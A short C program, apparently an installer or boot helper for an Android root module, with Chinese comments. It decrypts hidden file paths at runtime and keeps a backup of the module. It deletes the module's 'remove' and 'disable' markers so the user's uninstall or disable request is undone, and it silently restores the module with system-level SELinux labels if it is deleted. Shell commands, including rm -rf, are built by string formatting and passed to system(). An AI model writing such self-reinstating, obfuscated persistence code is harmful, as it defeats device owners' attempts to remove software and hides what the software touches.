#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

// 引入自动生成的加密文件
#include "encrypted_secrets.h"

int main() {
    // 运行时单次解密
    decrypt_str(enc_modpath, sizeof(enc_modpath));
    decrypt_str(enc_backup_path, sizeof(enc_backup_path));

    char *mod_path = (char*)enc_modpath;
    char *bk_path = (char*)enc_backup_path;

    char cmd[512];

    // 1. 集成你要求的安装/初始化备份逻辑：清空旧备份，建立新备份
    snprintf(cmd, sizeof(cmd), "rm -rf %s && mkdir -p %s", bk_path, bk_path);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "cp -af %s/* %s/ 2>/dev/null", mod_path, bk_path);
    system(cmd);

    // 2. 清除可能残存的卸载标记
    snprintf(cmd, sizeof(cmd), "rm -f %s/remove %s/disable 2>/dev/null", mod_path, mod_path);
    system(cmd);

    // 3. 容错验证：检查模块目录是否被损坏
    struct stat st;
    if (stat(mod_path, &st) != 0 && stat(bk_path, &st) == 0) {
        snprintf(cmd, sizeof(cmd), "cp -af %s %s", bk_path, mod_path);
        system(cmd);
        
        snprintf(cmd, sizeof(cmd), "chcon -R u:object_r:system_file:s0 %s 2>/dev/null", mod_path);
        system(cmd);
        
        snprintf(cmd, sizeof(cmd), "chmod 755 %s/my_service %s/my_post_fs 2>/dev/null", mod_path, mod_path);
        system(cmd);
    }

    return 0;
}
